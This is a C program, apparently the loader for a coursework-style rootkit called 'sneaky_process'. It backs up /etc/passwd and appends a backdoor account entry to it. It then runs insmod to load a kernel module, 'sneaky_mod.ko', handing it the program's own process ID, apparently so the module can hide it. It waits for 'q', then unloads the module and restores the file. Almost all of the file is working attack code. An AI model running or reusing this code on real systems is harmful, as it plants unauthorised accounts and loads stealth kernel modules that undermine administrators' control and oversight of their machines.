#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int pid = -1;

// copy content in file1 into file2
void cpFile(const char * file1, const char * file2) {
  FILE * f1 = fopen(file1, "r");
  FILE * f2 = fopen(file2, "w");
  if (f1 == NULL || f2 == NULL) {
    printf("File open failed\n");
    exit(1);
  }
  char cnt;
  while ((cnt = fgetc(f1)) != EOF) {
    fputc(cnt, f2);
  }
  printf("Succesfully copy\n");
  fclose(f1);
  fclose(f2);
}

// append extra line to file
void appendFile(const char * fileName, const char * cnt) {
  FILE * f1 = fopen(fileName, "a");
  if (f1 == NULL) {
    printf("File open failed in appendFile\n");
    exit(1);
  }
  printf("before fputs\n");
  fputs(cnt, f1);
  fclose(f1);
  printf("Succesfully append\n");
}

void loop() {
  int recved;
  printf("inside loop\n");
  do {
    recved = getchar();
    putchar(recved);
  } while (recved != 'q');
}

char * insmodCmd(int pid) {
  char pidArr[50];
  int digits = sprintf(pidArr, "%d", pid);
  printf("pidArr: %s\n", pidArr);
  printf("digits: %d\n", digits);
  char * res = malloc(sizeof(char) * 1000);
  strcpy(res, "insmod sneaky_mod.ko str=\"sneaky_process\" pidstr=\"");
  printf("res before loop: %s\n", res);
  int len = strlen(res);
  for (int i = 0; i < digits + 1; i++) {
    if (i == digits) {
      res[len + i] = '\"';
      res[len + i + 1] = '\0';
    }
    else {
      res[len + i] = pidArr[i];
    }
  }
  return res;
}

void test() {

}

int main() {
  // print own process ID
  pid = getpid();
  printf("sneaky_process pid = %d\n", pid);

  // copy from /etc/passwd to /tmp/passwd
  cpFile("/etc/passwd", "/tmp/passwd");
  appendFile("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  char * cmd1 = insmodCmd(pid);
  printf("%s\n", cmd1);
  int res1 = system(cmd1);
  if (res1 == -1) {return -1;}
  free(cmd1);
  loop();
  int res2 = system("rmmod sneaky_mod.ko");
  if (res2 == -1) {return -1;}   
  cpFile("/tmp/passwd", "/etc/passwd");

  return 0;
}
